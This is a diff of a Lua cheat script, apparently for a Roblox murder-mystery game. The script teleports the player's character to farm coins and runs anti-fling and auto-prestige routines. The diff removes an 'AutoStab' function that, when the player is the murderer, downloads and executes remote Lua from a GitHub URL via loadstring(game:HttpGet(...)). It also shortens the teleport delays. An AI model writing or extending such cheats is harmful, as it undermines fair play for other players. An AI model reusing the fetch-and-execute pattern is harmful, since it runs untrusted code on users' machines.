@@ -154,29 +154,6 @@ local function AutoPrestige()
     end)
 end
 
-local function AutoStab()
-    task.spawn(function()
-        while true do
-            local roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
-            local isMurderer
-            for name, data in pairs(roles) do
-                if name == player.Name and data.Role == "Murderer" then
-                    isMurderer = true
-                    break
-                else
-                    isMurderer = false
-                end
-            end
-
-            if isMurderer and player.PlayerGui.MainGUI.Game.CoinBags.Container.SnowToken:FindFirstChild("Full").Visible then
-                loadstring(game:HttpGet("https://raw.githubusercontent.com/ewqeeqweqeq/test/refs/heads/main/2.lua"))()
-            end
-
-            task.wait(0.2)
-        end
-    end)
-end
-
 local function waitForHumanoidRootPart(character, timeout)
     local root = character:FindFirstChild("HumanoidRootPart")
     if root then return root end
@@ -212,7 +189,6 @@ idlePlayer()
 startAntifling()
 createAnchorPart()
 AutoPrestige()
-AutoStab()
 
 while true do
     task.wait(1)
@@ -227,9 +203,9 @@ while true do
         local targetCoin = findCoinServer()
         if targetCoin and player.PlayerGui.MainGUI.Game.CoinBags.Container.SnowToken.Visible and not player.PlayerGui.MainGUI.Game.CoinBags.Container.SnowToken.Full.Visible then
             currentCharacter:SetPrimaryPartCFrame(targetCoin.CFrame * CFrame.new(0, 4, 0))
-            task.wait(0.7)
+            task.wait(0.5)
             currentCharacter:SetPrimaryPartCFrame(anchorPart.CFrame + Vector3.new(0, 5, 0))
-            task.wait(0.7)
+            task.wait(0.5)
         else
             currentCharacter:SetPrimaryPartCFrame(anchorPart.CFrame + Vector3.new(0, 5, 0))
         end
